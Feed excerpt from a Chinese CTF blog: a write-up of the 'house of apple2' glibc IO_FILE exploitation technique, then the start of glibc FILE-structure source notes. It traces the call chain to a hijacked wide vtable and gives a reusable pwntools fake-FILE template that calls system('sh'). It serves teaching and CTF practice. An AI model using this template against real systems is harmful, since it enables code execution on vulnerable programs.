class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现他和<code>_IO_FILE</code>结构体很像，其实作用几乎是相同的。我们来看为什么我们需要劫持这个成员，首先来看<code>_IO_wfile_jumps</code>结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据前面分析，我们会执行<code>_IO_wfile_seekoff</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir, <span class="type">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">off64_t</span> result;</span><br><span class="line">  <span class="type">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="type">long</span> <span class="type">int</span> count;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span></span><br><span class="line"><span class="comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span></span><br><span class="line"><span class="comment">     object. */</span></span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span></span><br><span class="line"><span class="comment">     offset of the underlying file must be exact.  */</span></span><br><span class="line">  <span class="type">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">== fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">       &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">   == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">       &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">      || _IO_in_put_mode (fp));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flush unwritten characters.</span></span><br><span class="line"><span class="comment">     (This may do an unneeded write if we seek within the buffer.</span></span><br><span class="line"><span class="comment">     But to be able to switch to reading, we would need to set</span></span><br><span class="line"><span class="comment">     egptr to pptr.  That can&#x27;t be done in the current design,</span></span><br><span class="line"><span class="comment">     which assumes file_ptr() is eGptr.  Anyway, since we probably</span></span><br><span class="line"><span class="comment">     end up flushing when we close(), it doesn&#x27;t make much difference.)</span></span><br><span class="line"><span class="comment">     <span class="doctag">FIXME:</span> simulate mem-mapped files. */</span></span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">    </span><br><span class="line">...(这个函数很长很长)</span><br></pre></td></tr></table></figure><p>fp指向当前FILE（例如puts函数对应stdout）。显然这个函数的条件判断等等都用的是指向wide_data中的成员来操作，所以我们需要将<code>_wide_data</code>指向一个可控地址来伪造条件才能进入我们想要进入的调用链。</p><h5 id="伪造条件进入调用链"><a href="#伪造条件进入调用链" class="headerlink" title="伪造条件进入调用链"></a>伪造条件进入调用链</h5><p>我们需要从seekoff函数进入到<code>_IO_switch_to_wget_mode</code>中，从上面的代码不难看出，我们想执行到这个函数，首先需要满足<code>was_writing</code>为真，即满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>。这就需要在<code>_wide_data</code>对应的可控地址中进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span>      &lt;--改小</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span>    &lt;--改大</span><br><span class="line">  <span class="type">wchar_t</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span>  &lt;--下面还会修改这个指针为可控地址</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>再来关注<code>_IO_switch_to_wget_mode</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">  <span class="keyword">if</span> (_IO_in_backup (fp))</span><br><span class="line">    fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_backup_base;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_read_base = fp-&gt;_wide_data-&gt;_IO_buf_base;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_read_end = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line">    &#125;</span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_read_ptr = fp-&gt;_wide_data-&gt;_IO_write_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_wide_data-&gt;_IO_write_base = fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    = fp-&gt;_wide_data-&gt;_IO_write_end = fp-&gt;_wide_data-&gt;_IO_read_ptr;</span><br><span class="line"></span><br><span class="line">  fp-&gt;_flags &amp;= ~_IO_CURRENTLY_PUTTING;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当满足<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>时，会执行到<code>_IO_WOVERFLOW</code>函数，刚刚已经构造好了，所以不用再修改其他东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \</span></span><br><span class="line"><span class="meta">  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \</span></span><br><span class="line"><span class="meta">       + offsetof(TYPE, MEMBER)))</span></span><br></pre></td></tr></table></figure><p>它会通过宏展开调用到<code>_wide_vtable</code>指向的虚表中的<code>__overflow</code>指向的函数。而这个虚表没有检查，所以可以将<code>__overflow</code>指针改成ogg或者system函数，通过上述调用链，就能拿到shell了。想要修改函数指针，我们就需要将<code>_wide_vtable</code>指针成员改为可控地址，并在对应偏移处写上你想要劫持的函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __overflow (FILE *, <span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>根据函数原型可知函数的第一个参数是FILE指针本身，所以如果有参数，要写在flags位上，前面要加上两个空格。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>调用链如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">puts</span></span><br><span class="line">  _IO_XSPUTN（原解析） --&gt; _IO_wfile_seekoff（现解析）</span><br><span class="line">     _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">           *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>要修改的东西如下(fp代指<code>_IO_2_1_stdout_-&gt;file</code>)：</p><ul><li><code>vtable </code>改成<code>_IO_wfile_jumps+0x10</code></li><li><code>fp -&gt; _wide_data</code>改成一个可控地址，这道题里直接改成了<code>_IO_2_1_stdout_</code></li><li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable</code>改成一个可控地址,这道题里改成了<code>_IO_2_1_stdout_-8</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable -&gt; overflow</code>改成ogg或system</li></ul><h4 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="关于-lock的一些思考"><a href="#关于-lock的一些思考" class="headerlink" title="关于_lock的一些思考"></a>关于_lock的一些思考</h4><p>每个师傅自己调的板子都会有些不太一样，有些师傅的wp里会给file中的<code>_lock</code>也写上一个值，有些没有，甚至每个板子写的lock地址还不一样。这个应该和题目或者是调用链有关。我想尝试从源码或者汇编中找出一些关于覆写_lock的必要性，奈何水平不够，没能分析出来个所以然，但是网上也没有多少师傅提到过这个成员，唯一能找到的说法是要给lock覆写一个可写地址。我尝试在这道题里随便写上一个堆地址，但是没能打通。下面大概讲讲我挣扎的过程，但是结论有待验证。</p><p>我们先来看看不给lock覆写值会发生什么。从脚本进行调试并且链接了源码调试。<img src="https://c-lby.top/images/2024deadsec_wp/apple2_lock%E6%97%A0%E8%A6%86%E5%86%99%E6%8A%A5%E9%94%99.png" alt="apple2_lock无覆写报错"></p><p>程序卡在一个<code>cmpxchg</code>的指令，对应的源码是和lock相关的。那个语句可以通过宏定义展开，但是我看的一头雾水，所以我选择去看看其对应的汇编语句。<img src="https://c-lby.top/images/2024deadsec_wp/IO_file_underflow.png" alt="_IO_file_underflow"></p><p>从0x8CAFB开始往下分析，首先将<code>_IO_2_1_stdout_</code>的地址赋给了r12，将flags与0x8000做与运算并根据结果选择分支；如果不满足跳转条件，则取出stdout+0x88也就是_lock处的内容赋给rdi，将fs+0x10（是一个指向tls结构体的指针）赋给了rbp，然后将<code>_lock</code>处内容+8后取出里面的内容和rbp做比较，然后分支可能就会进入到cmpxchg指令中。关于这个指令的解释网上<a href="https://coderatwork.cn/posts/linux-cmpxchg/">资料</a>有很多，简单来讲就是个比较交换的操作。</p><p>在上述这些步骤中，我们可以关注到关于这个lock至少需要满足这些要求：</p><ul><li>[_lock]可读</li><li>[_lock+8]可读</li><li>[[_lock]]可写</li></ul><p>其实也就是覆写上去的那个地址要可写。当然，这些条件不是在每个情况下都要满足，也不是在每道题都要写lock的，上述过程里是有几个条件判断分支的，所以要结合具体情况来分析到底需不需要写lock上去。</p><p>我并不确定我的分析是否正确，结论也只经过了少量验证，而且总有几率会-11报错终止程序，所以有待进一步分析。并且目前遇到了另一个奇怪的问题。_lock只被覆写了低两个字节，而高四个字节依然是libc的地址的高位（经过几次实验发现是<code>_IO_stdfile_1_lock</code>的地址高位）。如下，我写入一个堆地址，然而lock位上的地址只有两位被改变了。这个问题尚未找到原因。就这个情况而言，我们只能写一个和<code>_IO_stdfile_1_lock</code>很接近的地址才能行得通，堆地址是不行的。这样的话好像不如直接写固定偏移（0x21ca70）好了。（24.8.7）</p><p><img src="https://c-lby.top/images/2024deadsec_wp/%E5%86%99%E5%85%A5%E7%9A%84%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="写入的堆地址"></p><p>经过挣扎，又问了xf1les爷，终于找到答案了。这里用堆地址没法打通只是这道题用了gets函数来接收数据的原因。因为gets函数是逐字节读取数据的，这也就意味着地址会一个字节一个字节地写到lock上，然而写上去的过程中，gets会不断调用<code>_IO_acquire_lock(stdout)</code>，也就是从stdout这个fp中取出lock来用，而其中lock地址可能不是一个可读可写的地址，这就导致了程序会一直卡在cmpxchg这个指令上。如果是read函数，则这样的问题不会出现，堆地址是可以使用的。（24.8.10）</p><p>从另一个角度看，如果调用链和程序原本的函数没有使用到stdout的lock的话，我们甚至可以不用覆写lock。这也就是为什么有些师傅的板子里没有写lock。</p><h3 id="0x02-如何调试程序『LitCTF2024』2-35"><a href="#0x02-如何调试程序『LitCTF2024』2-35" class="headerlink" title="0x02 如何调试程序『LitCTF2024』2.35"></a>0x02 如何调试程序『LitCTF2024』2.35</h3><p>执行流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">_IO_cleanup</span><br><span class="line">_IO_flush_all_lockp</span><br><span class="line">_IO_wfile_overflow</span><br><span class="line">_IO_wdoallocbuf</span><br><span class="line">_IO_WDOALLOCATE --&gt; system</span><br></pre></td></tr></table></figure><h5 id="调试板子："><a href="#调试板子：" class="headerlink" title="调试板子："></a>调试板子：</h5><p>断点在脚本edit之后，exit之前。</p><p>查看修改后的_IO_list_all</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p/x *(struct _IO_FILE_plus *)_IO_list_all</span><br></pre></td></tr></table></figure><p><img src="D:\LBY_BLOG\LBY_BLOG\source\images\2024deadsec_wp\lit劫持后的IO_list_all.png" alt="lit劫持后的IO_list_all"></p><p>可以看到vtable已经被劫持为<code>_IO_wfile_jumps</code>了。同时也可以看到<code>_wide_data</code>也被劫持成了一个堆地址，这个堆地址是通过largebin attack写进去的。</p>]]></content>
    
    
    <summary type="html">学习和使用house of apple2的一些自己的理解。</summary>
    
    
    
    <category term="Heap Exploitation" scheme="https://c-lby.top/categories/Heap-Exploitation/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="IO_FILE" scheme="https://c-lby.top/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>『glibc源码补完计划』IO_FILE</title>
    <link href="https://c-lby.top/2024/07/30/glibc-IO/"/>
    <id>https://c-lby.top/2024/07/30/glibc-IO/</id>
    <published>2024-07-30T04:26:11.000Z</published>
    <updated>2024-08-07T15:02:47.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><h5 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h5><p><code>_IO_FILE_plus</code>定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>FILE</code>的定义是<code>typedef struct _IO_FILE FILE;</code></p><h5 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h5><p>我们查看<code>_IO_FILE</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE</code>在满足<code>_IO_USE_OLD_IO_FILE</code>的情况下才会转变完善为<code>_IO_FILE_complete</code>。一个进程中的所有FILE结构会通过<code>_chain</code>来连接成一个单向链表，并通过<code>_IO_list_all</code>来记录链表头部。而这个变量在进程一开始是直接指向<code>_IO_2_1_stderr_</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>这里补充一个点，所有进程启动都会自动创建stdin、stdout、stderr三个FILE结构，存在libc.so的数据段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br></pre></td></tr></table></figure><p>其他通过fopen等函数创建出来的FILE结构一般会被分配到堆中储存，而这些函数的返回值通常就是指向该FILE结构的指针。</p><h5 id="IO-jump-t-vtable"><a href="#IO-jump-t-vtable" class="headerlink" title="_IO_jump_t *vtable"></a>_IO_jump_t 